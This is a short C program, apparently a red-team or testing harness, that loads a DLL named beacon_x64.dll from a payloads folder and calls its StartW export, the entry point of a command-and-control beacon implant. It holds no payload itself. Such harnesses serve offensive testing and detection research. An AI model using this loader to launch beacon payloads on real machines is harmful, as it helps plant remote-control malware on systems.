// compilation: cl.exe .\example-runbeacon.c /nologo
#include <windows.h>
#include <stdio.h>

// There are two ways to invoke the DLL
// Option 1: Standard Rundll32 signature for wide-char exports
typedef void (WINAPI *StartW_Rundll_t)(HWND, HINSTANCE, LPWSTR, int);
// Option 2: Generic void parameter signature
typedef void (__cdecl *StartW_Void_t)(void);

int main() {
    printf("[Harness] Loading DLL...\n");
    HMODULE hMod = LoadLibraryA("c:\\payloads\\beacon_x64.dll");
    if (!hMod) {
        printf("[ERROR] Failed to load DLL (Error: %lu)\n", GetLastError());
        return 1;
    }

    // Resolve the exported entry point
    FARPROC pFunc = GetProcAddress(hMod, "StartW");
    if (!pFunc) {
        printf("[ERROR] Failed to find StartW export (Error: %lu)\n", GetLastError());
        FreeLibrary(hMod);
        return 1;
    }

    printf("[Harness] StartW found at: %p\n", (void*)pFunc);

    // Call StartW with rundll32 arguments:
    /*StartW_Rundll_t pfnStartW = (StartW_Rundll_t)pFunc;
    printf("[Harness] Invoking StartW...\n");
    pfnStartW(NULL, hMod, L"", SW_SHOW);*/

    // Calling StartW without arguments:
    StartW_Void_t pfnStartW = (StartW_Void_t)pFunc;
    pfnStartW();
    

    printf("[Harness] Execution finished.\n");
    FreeLibrary(hMod);
    return 0;
}